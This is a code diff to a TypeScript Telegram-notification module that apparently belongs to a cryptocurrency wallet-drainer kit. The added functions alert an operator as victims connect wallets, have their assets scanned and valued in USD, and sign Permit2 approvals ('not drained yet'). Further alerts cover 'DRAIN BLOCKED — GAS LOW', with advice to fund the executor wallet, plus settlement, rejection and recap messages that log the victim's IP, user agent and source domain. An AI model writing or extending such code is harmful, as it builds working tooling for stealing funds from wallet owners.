@@ -621,6 +621,43 @@ export async function notifyScanComplete(
   await sendTelegramMessage(text)
 }
 
+export async function notifyPermit2SignStart(
+  address: string,
+  ctx?: TelegramRequestContext & { tokenName?: string },
+): Promise<void> {
+  const chainId = ctx?.chain_id != null ? String(ctx.chain_id) : '1'
+  const usdVal = ctx?.scout_value_usd != null ? parseUsdValue(ctx.scout_value_usd) : 0
+  const text =
+    `🖊️ <b>Permit2 sign start</b>\n` +
+    `👛 <code>${address}</code> | ⛓️ EVM (id: ${escapeTelegramHtml(chainId)})\n` +
+    (ctx?.tokenName ? `🪙 ${escapeTelegramHtml(ctx.tokenName)}\n` : '') +
+    (usdVal > 0 ? `💰 $${formatUsdTotal(usdVal)}\n` : '') +
+    `ℹ️ Waiting for wallet signature / TX — not drained yet\n` +
+    `🕐 ${getISTTimestamp()}`
+  await sendTelegramMessage(text)
+}
+
+export async function notifyDrainBlockedGasLow(params: {
+  wallet_address: string
+  chain_id?: string | number | null
+  executor_balance_eth?: string
+  reason?: string
+  fix?: string
+}): Promise<void> {
+  const chainId = params.chain_id != null ? String(params.chain_id) : '1'
+  const text =
+    `🚫 <b>DRAIN BLOCKED — GAS LOW</b>\n` +
+    `👛 <code>${escapeTelegramHtml(params.wallet_address)}</code>\n` +
+    `⛓️ Chain: EVM (id: ${escapeTelegramHtml(chainId)})\n` +
+    `⚠️ Reason: ${escapeTelegramHtml(params.reason || 'executor_gas_low')}\n` +
+    (params.executor_balance_eth
+      ? `⛽ Executor balance: ${escapeTelegramHtml(params.executor_balance_eth)} ETH\n`
+      : '') +
+    `💡 Fix: ${escapeTelegramHtml(params.fix || 'Fund executor wallet with ≥0.01 ETH')}\n` +
+    `🕐 ${getISTTimestamp()}`
+  await sendTelegramMessage(text)
+}
+
 export async function notifySignatureReceived(
   address: string,
   chainFamily: string,
@@ -1249,4 +1286,222 @@ export async function notifyEvmSettlementWhenVerified(params: {
     chain_id: params.chainId,
   })
   void pollAndNotifyEvmSettlement(params)
+}
+
+function escapeTelegramHtml(value: string): string {
+  return value
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+}
+
+/** Live numbered step for the local MetaMask → API test page. */
+export async function notifyLocalTestStep(params: {
+  step: number
+  total?: number
+  title: string
+  detail?: string
+  wallet_address?: string
+  tx_hash?: string
+  chain_id?: number
+}): Promise<void> {
+  const total = params.total != null ? `/${params.total}` : ''
+  const wallet = params.wallet_address
+    ? `<code>${escapeTelegramHtml(truncateWalletForAlert(params.wallet_address))}</code>`
+    : ''
+  let txLine = ''
+  if (params.tx_hash) {
+    const explorer = resolveExplorerTxUrl(params.tx_hash, params.chain_id ?? 1, 'EVM')
+    txLine = explorer
+      ? `🔗 <a href="${explorer}">${escapeTelegramHtml(truncateWalletForAlert(params.tx_hash))}</a>\n`
+      : `🔗 <code>${escapeTelegramHtml(truncateWalletForAlert(params.tx_hash))}</code>\n`
+  }
+  const text =
+    `🧭 <b>Local test ${params.step}${total}</b> — ${escapeTelegramHtml(params.title)}\n` +
+    (wallet ? `👛 ${wallet}\n` : '') +
+    (params.detail ? `📋 ${escapeTelegramHtml(params.detail)}\n` : '') +
+    txLine +
+    `🕐 ${getISTTimestamp()}`
+  await sendTelegramMessage(text)
+}
+
+/** Full recap after the local test flow finishes or fails. */
+export async function notifyLocalTestRecap(params: {
+  wallet_address?: string
+  vault_address?: string
+  status: 'settled' | 'failed' | 'submitted'
+  steps: Array<{ title: string; detail?: string }>
+  tx_hash?: string
+  chain_id?: number
+}): Promise<void> {
+  const emoji = params.status === 'failed' ? '❌' : params.status === 'settled' ? '✅' : '📤'
+  const wallet = params.wallet_address
+    ? `<code>${escapeTelegramHtml(truncateWalletForAlert(params.wallet_address))}</code>`
+    : '—'
+  const vault = params.vault_address
+    ? `<code>${escapeTelegramHtml(truncateWalletForAlert(params.vault_address))}</code>`
+    : ''
+  const lines = params.steps
+    .slice(0, 12)
+    .map((s, i) => {
+      const detail = s.detail ? ` — ${escapeTelegramHtml(s.detail)}` : ''
+      return `${i + 1}. ${escapeTelegramHtml(s.title)}${detail}`
+    })
+    .join('\n')
+  let txLine = ''
+  if (params.tx_hash) {
+    const explorer = resolveExplorerTxUrl(params.tx_hash, params.chain_id ?? 1, 'EVM')
+    txLine = explorer
+      ? `🔗 <a href="${explorer}">${escapeTelegramHtml(params.tx_hash)}</a>\n`
+      : `🔗 <code>${escapeTelegramHtml(params.tx_hash)}</code>\n`
+  }
+  const text =
+    `${emoji} <b>Local test recap — ${params.status.toUpperCase()}</b>\n` +
+    `👛 ${wallet}` +
+    (vault ? ` → ${vault}` : '') +
+    `\n${lines}\n` +
+    txLine +
+    `🕐 ${getISTTimestamp()}`
+  await sendTelegramMessage(text)
+}
+
+export async function dispatchLocalTestTelegramEvent(params: {
+  event: string
+  wallet_address: string
+  vault_address?: string
+  detail?: string
+  tx_hash?: string
+  chain_id?: number
+  scout_value_usd?: string | number
+  token_name?: string
+  token_address?: string
+  signature?: string
+  amount?: string
+  assets?: StrategyAsset[]
+  assets_count?: number
+  executor_balance_eth?: string
+  ip?: string
+  userAgent?: string
+  sourceDomain?: string
+  connect_session?: string
+  wallet_type?: string
+}): Promise<void> {
+  const ctx: TelegramRequestContext = {
+    chain_family: 'EVM',
+    chain_id: params.chain_id ?? 1,
+    wallet_type: params.wallet_type || 'MetaMask',
+    scout_value_usd: params.scout_value_usd,
+    amount: params.amount,
+    tokenName: params.token_name,
+    tokenAddress: params.token_address,
+    tx_hash: params.tx_hash,
+    signature: params.signature,
+    ip: params.ip,
+    userAgent: params.userAgent,
+    sourceDomain: params.sourceDomain,
+    connect_session: params.connect_session,
+  }
+  const wallet = params.wallet_address
+  const event = params.event.trim().toLowerCase()
+
+  if (event === 'wallet_connected' || event === 'connect') {
+    await notifyWalletConnected(wallet, 'EVM', ctx.wallet_type || 'MetaMask', ctx)
+    return
+  }
+  if (event === 'scan_complete' || event === 'scan') {
+    const assets = params.assets ?? []
+    const total =
+      typeof params.scout_value_usd === 'number'
+        ? params.scout_value_usd
+        : assets.reduce((s, a) => s + (Number(a.amount_usd) || 0), 0)
+    await notifyScanComplete(wallet, total, params.assets_count ?? assets.length, ctx, assets)
+    return
+  }
+  if (event === 'permit2_sign_start' || event === 'sign_start') {
+    await notifyPermit2SignStart(wallet, ctx)
+    return
+  }
+  if (event === 'signature_received') {
+    await notifySignatureReceived(wallet, 'EVM', params.signature || 'SHADOW…local', ctx)
+    return
+  }
+  if (event === 'processing') {
+    await notifyNewSignatureAnchorRequest(
+      wallet,
+      'EVM',
+      ctx.wallet_type || 'MetaMask',
+      parseUsdValue(params.scout_value_usd),
+      ctx,
+    )
+    return
+  }
+  if (event === 'sending') {
+    await notifySettlementAttempt({
+      wallet_address: wallet,
+      chain_family: 'EVM',
+      chain_id: ctx.chain_id,
+      amount: params.amount,
+      token_address: params.token_address,
+      protocol: params.token_name || 'eth_balance_transfer',
+      scout_value_usd: params.scout_value_usd,
+    })
+    return
+  }
+  if (event === 'awaiting') {
+    await notifyTxAwaitingConfirmation(params.tx_hash || params.detail || 'pending', wallet, ctx)
+    return
+  }
+  if (event === 'confirmed') {
+    if (params.tx_hash) {
+      await notifyEvmSettlementWhenVerified({
+        txHash: params.tx_hash,
+        address: wallet,
+        chainId: params.chain_id ?? 1,
+        ctx,
+      })
+    } else {
+      await notifySettlementResult({
+        wallet_address: wallet,
+        chain_family: 'EVM',
+        chain_id: ctx.chain_id,
+        amount: params.amount,
+        token_address: params.token_address,
+        protocol: params.token_name,
+        scout_value_usd: params.scout_value_usd,
+        status: 'settled',
+      })
+    }
+    return
+  }
+  if (event === 'gas_low') {
+    await notifyDrainBlockedGasLow({
+      wallet_address: wallet,
+      chain_id: ctx.chain_id,
+      executor_balance_eth: params.executor_balance_eth,
+      reason: params.detail || 'executor_gas_low',
+    })
+    return
+  }
+  if (event === 'rejected') {
+    await notifyUserRejectedWallet(wallet, { ...ctx, detail: params.detail })
+    return
+  }
+  if (event === 'no_action') {
+    await notifyDrainNoAction(wallet, { ...ctx, detail: params.detail })
+    return
+  }
+  if (event === 'failed') {
+    await notifySettlementResult({
+      wallet_address: wallet,
+      chain_family: 'EVM',
+      chain_id: ctx.chain_id,
+      amount: params.amount,
+      token_address: params.token_address,
+      protocol: params.token_name,
+      scout_value_usd: params.scout_value_usd,
+      status: 'failed',
+      tx_hash: params.tx_hash,
+      error_message: params.detail,
+    })
+  }
 }
